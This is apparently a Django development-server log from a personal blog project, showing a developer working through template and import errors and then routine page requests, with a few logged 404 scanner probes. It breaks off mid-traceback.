Watching for file changes with StatReloader
Exception in thread django-main-thread:
Traceback (most recent call last):
  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.6/threading.py", line 864, in run
    self._target(*self._args, **self._kwargs)
  File "/root/myvenv/lib/python3.6/site-packages/django/utils/autoreload.py", line 53, in wrapper
    fn(*args, **kwargs)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/management/commands/runserver.py", line 118, in inner_run
    self.check(display_num_errors=True)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/management/base.py", line 396, in check
    databases=databases,
  File "/root/myvenv/lib/python3.6/site-packages/django/core/checks/registry.py", line 70, in run_checks
    new_errors = check(app_configs=app_configs, databases=databases)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/checks/urls.py", line 13, in check_url_config
    return check_resolver(resolver)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/checks/urls.py", line 23, in check_resolver
    return check_method()
  File "/root/myvenv/lib/python3.6/site-packages/django/urls/resolvers.py", line 408, in check
    for pattern in self.url_patterns:
  File "/root/myvenv/lib/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/root/myvenv/lib/python3.6/site-packages/django/urls/resolvers.py", line 589, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/root/myvenv/lib/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/root/myvenv/lib/python3.6/site-packages/django/urls/resolvers.py", line 582, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "/root/myblog/urls.py", line 21, in <module>
    path('',include('BlogMain.urls')),
  File "/root/myvenv/lib/python3.6/site-packages/django/urls/conf.py", line 34, in include
    urlconf_module = import_module(urlconf_module)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "/root/BlogMain/urls.py", line 2, in <module>
    from views import *
ModuleNotFoundError: No module named 'views'

/root/BlogMain/urls.py changed, reloading.
Performing system checks...

Watching for file changes with StatReloader
[11/Jan/2021 07:44:22] "GET /admin HTTP/1.1" 301 0
[11/Jan/2021 07:44:22] "GET /admin/ HTTP/1.1" 200 3307
[11/Jan/2021 07:44:22] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
[11/Jan/2021 07:44:22] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
[11/Jan/2021 07:44:22] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
[11/Jan/2021 07:44:22] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18617
[11/Jan/2021 07:44:22] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
[11/Jan/2021 07:44:22] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
[11/Jan/2021 07:44:22] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[11/Jan/2021 07:44:22] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[11/Jan/2021 07:44:22] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
[11/Jan/2021 07:44:22] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
[11/Jan/2021 07:44:22] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
Not Found: /favicon.ico
[11/Jan/2021 07:44:22] "GET /favicon.ico HTTP/1.1" 404 2137
[11/Jan/2021 07:44:49] "GET /admin/ HTTP/1.1" 200 3307
Internal Server Error: /
Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/root/BlogMain/views.py", line 5, in BlogMainHtml
    return render(request, 'templates/blog_main.html')
  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 19, in get_template
    raise TemplateDoesNotExist(template_name, chain=chain)
django.template.exceptions.TemplateDoesNotExist: templates/blog_main.html
[11/Jan/2021 07:44:52] "GET / HTTP/1.1" 500 71219
/root/BlogMain/views.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 11, 2021 - 07:44:17
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
Internal Server Error: /
Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/root/BlogMain/views.py", line 5, in BlogMainHtml
    return render(request, 'templates/blog_base.html')
  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 19, in get_template
    raise TemplateDoesNotExist(template_name, chain=chain)
django.template.exceptions.TemplateDoesNotExist: templates/blog_base.html
[11/Jan/2021 07:45:18] "GET / HTTP/1.1" 500 71356
/root/BlogMain/views.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 11, 2021 - 07:45:15
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
/root/BlogMain/views.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 11, 2021 - 07:45:35
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
Internal Server Error: /
Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/root/BlogMain/views.py", line 5, in BlogMainHtml
    return render(request, 'templates/main/blog_name.html')
  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 19, in get_template
    raise TemplateDoesNotExist(template_name, chain=chain)
django.template.exceptions.TemplateDoesNotExist: templates/main/blog_name.html
[11/Jan/2021 07:46:04] "GET / HTTP/1.1" 500 71436
/root/BlogMain/views.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 11, 2021 - 07:46:03
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
Internal Server Error: /
Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/root/BlogMain/views.py", line 5, in BlogMainHtml
    return render(request, 'main/blog_name.html')
  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 19, in get_template
    raise TemplateDoesNotExist(template_name, chain=chain)
django.template.exceptions.TemplateDoesNotExist: main/blog_name.html
[11/Jan/2021 07:46:50] "GET / HTTP/1.1" 500 71276
/root/BlogMain/views.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 11, 2021 - 07:46:48
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
Internal Server Error: /
Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
    compile_func = self.tags[command]
KeyError: 'extend'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/root/BlogMain/views.py", line 5, in BlogMainHtml
    return render(request, 'main/blog_main.html')
  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
    return engine.get_template(template_name)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
    return Template(self.engine.get_template(template_name), self)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
    template, origin = self.find_template(template_name)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
    template = loader.get_template(name, skip=skip)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
    contents, origin, origin.template_name, self.engine,
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
    self.nodelist = self.compile_nodelist()
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
    return parser.parse()
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
    self.invalid_block_tag(token, command, parse_until)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 534, in invalid_block_tag
    "or load this tag?" % (token.lineno, command)
django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 1: 'extend'. Did you forget to register or load this tag?
[11/Jan/2021 07:47:38] "GET / HTTP/1.1" 500 111934
/root/BlogMain/views.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 11, 2021 - 07:47:35
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
[11/Jan/2021 07:47:55] "GET / HTTP/1.1" 200 189
/root/BlogMain/views.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 11, 2021 - 07:47:54
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
Internal Server Error: /
Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
    compile_func = self.tags[command]
KeyError: 'extend'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/root/BlogMain/views.py", line 5, in BlogMainHtml
    return render(request, 'main/blog_main.html')
  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
    return engine.get_template(template_name)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
    return Template(self.engine.get_template(template_name), self)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
    template, origin = self.find_template(template_name)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
    template = loader.get_template(name, skip=skip)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
    contents, origin, origin.template_name, self.engine,
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
    self.nodelist = self.compile_nodelist()
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
    return parser.parse()
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
    self.invalid_block_tag(token, command, parse_until)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 534, in invalid_block_tag
    "or load this tag?" % (token.lineno, command)
django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 1: 'extend'. Did you forget to register or load this tag?
[11/Jan/2021 07:48:01] "GET / HTTP/1.1" 500 111934
Internal Server Error: /
Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
    compile_func = self.tags[command]
KeyError: 'extend'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/root/BlogMain/views.py", line 5, in BlogMainHtml
    return render(request, 'main/blog_main.html')
  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
    return engine.get_template(template_name)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
    return Template(self.engine.get_template(template_name), self)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
    template, origin = self.find_template(template_name)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
    template = loader.get_template(name, skip=skip)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
    contents, origin, origin.template_name, self.engine,
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
    self.nodelist = self.compile_nodelist()
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
    return parser.parse()
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
    self.invalid_block_tag(token, command, parse_until)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 534, in invalid_block_tag
    "or load this tag?" % (token.lineno, command)
django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 1: 'extend'. Did you forget to register or load this tag?
[11/Jan/2021 07:49:18] "GET / HTTP/1.1" 500 111954
Internal Server Error: /
Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 61, in render
    return self.template.render(context)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 170, in render
    return self._render(context)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 162, in _render
    return self.nodelist.render(context)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 938, in render
    bit = node.render_annotated(context)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 905, in render_annotated
    return self.render(context)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 127, in render
    compiled_parent = self.get_parent(context)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 124, in get_parent
    return self.find_template(parent, context)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 104, in find_template
    template_name, skip=history,
  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 129, in find_template
    raise TemplateDoesNotExist(name, tried=tried)
django.template.exceptions.TemplateDoesNotExist: blog_base.html

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/root/BlogMain/views.py", line 5, in BlogMainHtml
    return render(request, 'main/blog_main.html')
  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 62, in render_to_string
    return template.render(context, request)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 63, in render
    reraise(exc, self.backend)
  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 84, in reraise
    raise new from exc
django.template.exceptions.TemplateDoesNotExist: blog_base.html
[11/Jan/2021 07:49:29] "GET / HTTP/1.1" 500 114113
[11/Jan/2021 07:50:14] "GET / HTTP/1.1" 200 189
Watching for file changes with StatReloader
[15/Jan/2021 08:13:54] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:13:54] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:13:55] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:13:56] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:13:57] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:14:15] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:14:17] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:14:17] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:14:18] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:14:18] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:14:22] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:15:11] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:15:12] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:15:12] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:15:12] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:32:35] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:32:35] "GET /static/css/blog_base.css HTTP/1.1" 200 823
[15/Jan/2021 08:32:35] "GET /static/images/logo_signup.png HTTP/1.1" 304 0
[15/Jan/2021 08:32:35] "GET /static/images/logo_signin.png HTTP/1.1" 304 0
Not Found: /login
[15/Jan/2021 08:39:30] "GET /login HTTP/1.0" 404 2121
Not Found: /manager/html
[15/Jan/2021 08:39:30] "GET /manager/html HTTP/1.0" 404 2142
[15/Jan/2021 08:41:03] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:41:03] "GET /static/css/blog_base.css HTTP/1.1" 304 0
[15/Jan/2021 08:41:04] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:41:04] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:41:04] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:41:05] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:41:05] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:41:27] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:41:27] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:41:29] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:41:29] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:41:35] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:41:35] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 08:43:16] "GET / HTTP/1.1" 200 847
[15/Jan/2021 08:43:16] "GET /static/css/blog_base.css HTTP/1.1" 200 824
[15/Jan/2021 08:43:16] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 08:43:16] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 08:43:16] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /http:/110.242.68.4/
[15/Jan/2021 08:49:02] "HEAD http://110.242.68.4/ HTTP/1.1" 404 1670
[15/Jan/2021 08:54:11] "GET / HTTP/1.1" 200 847
[15/Jan/2021 09:23:13] "GET / HTTP/1.1" 200 847
[15/Jan/2021 09:23:13] "GET /static/css/blog_base.css HTTP/1.1" 304 0
[15/Jan/2021 09:23:13] "GET /static/images/logo_signin.png HTTP/1.1" 304 0
[15/Jan/2021 09:23:13] "GET /static/images/logo_signup.png HTTP/1.1" 304 0
[15/Jan/2021 09:24:10] "GET / HTTP/1.1" 200 847
[15/Jan/2021 09:24:10] "GET /static/css/blog_base.css HTTP/1.1" 200 821
[15/Jan/2021 09:24:10] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:24:10] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:24:10] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:25:23] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:25:23] "GET /static/css/blog_base.css HTTP/1.1" 200 886
[15/Jan/2021 09:25:23] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:25:23] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:25:23] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:25:34] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:25:34] "GET /static/css/blog_base.css HTTP/1.1" 200 886
[15/Jan/2021 09:25:34] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:25:34] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:25:34] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:25:54] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:25:54] "GET /static/css/blog_base.css HTTP/1.1" 200 902
[15/Jan/2021 09:25:54] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:25:54] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:25:54] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:26:03] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:26:03] "GET /static/css/blog_base.css HTTP/1.1" 200 902
[15/Jan/2021 09:26:03] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:26:03] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:26:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:26:25] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:26:25] "GET /static/css/blog_base.css HTTP/1.1" 200 902
[15/Jan/2021 09:26:25] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:26:25] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:26:25] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:26:32] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:26:33] "GET /static/css/blog_base.css HTTP/1.1" 200 902
[15/Jan/2021 09:26:33] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:26:33] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:26:33] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:26:37] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:26:38] "GET /static/css/blog_base.css HTTP/1.1" 200 902
[15/Jan/2021 09:26:38] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:26:38] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:26:38] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:27:12] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:27:12] "GET /static/css/blog_base.css HTTP/1.1" 200 901
[15/Jan/2021 09:27:12] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:27:12] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:27:12] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:27:18] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:27:19] "GET /static/css/blog_base.css HTTP/1.1" 200 901
[15/Jan/2021 09:27:19] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:27:19] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:27:19] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:27:32] "GET / HTTP/1.1" 200 789
[15/Jan/2021 09:27:32] "GET /static/css/blog_base.css HTTP/1.1" 200 901
[15/Jan/2021 09:27:32] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:27:32] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:27:32] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:47:06] "GET / HTTP/1.1" 200 979
[15/Jan/2021 09:47:07] "GET /static/css/blog_base_total.css HTTP/1.1" 404 1692
[15/Jan/2021 09:47:07] "GET /static/css/blog_base_header.css HTTP/1.1" 200 848
[15/Jan/2021 09:47:07] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 0
[15/Jan/2021 09:47:07] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:47:07] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:47:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:47:35] "GET / HTTP/1.1" 200 979
[15/Jan/2021 09:47:35] "GET /static/css/blog_base_total.css HTTP/1.1" 404 1692
[15/Jan/2021 09:47:35] "GET /static/css/blog_base_header.css HTTP/1.1" 200 848
[15/Jan/2021 09:47:35] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 0
[15/Jan/2021 09:47:35] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:47:35] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:47:35] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:47:36] "GET / HTTP/1.1" 200 979
[15/Jan/2021 09:47:36] "GET /static/css/blog_base_total.css HTTP/1.1" 404 1692
[15/Jan/2021 09:47:36] "GET /static/css/blog_base_header.css HTTP/1.1" 200 848
[15/Jan/2021 09:47:36] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 0
[15/Jan/2021 09:47:36] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:47:36] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:47:37] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 09:48:18] "GET / HTTP/1.1" 200 979
[15/Jan/2021 09:48:18] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 09:48:18] "GET /static/css/blog_base_header.css HTTP/1.1" 200 848
[15/Jan/2021 09:48:18] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 0
[15/Jan/2021 09:48:18] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 09:48:18] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 09:48:18] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /HNAP1/
Traceback (most recent call last):
  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib/python3.6/wsgiref/handlers.py", line 183, in finish_response
    self.close()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 113, in close
    self.get_stdin()._read_limited()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/wsgi.py", line 28, in _read_limited
    result = self.stream.read(size)
